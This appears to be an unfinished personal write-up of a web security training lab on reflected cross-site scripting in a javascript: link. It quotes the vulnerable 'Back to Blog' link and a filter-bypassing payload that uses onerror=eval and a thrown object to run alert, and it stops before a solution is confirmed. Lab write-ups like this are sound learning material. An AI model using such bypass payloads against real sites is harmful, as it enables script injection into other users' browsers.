# Lab: Reflected XSS in a JavaScript URL with some characters blocked

 This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.

To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message. 

# Step 1 Find a potential attack vector

I believe I have found a potential location for a reflected xss attack with the back to blog link:

![image](https://user-images.githubusercontent.com/83407557/211170280-364cc2c1-ecc6-4f3a-b50c-dc9ae0adce5f.png)

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4'}).finally(_ => window.location = '/')">Back to Blog</a>
```

Since I can control the POST request what happens if I add a payload like the following:

```html
{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}
```
Finish up later, on the right track....

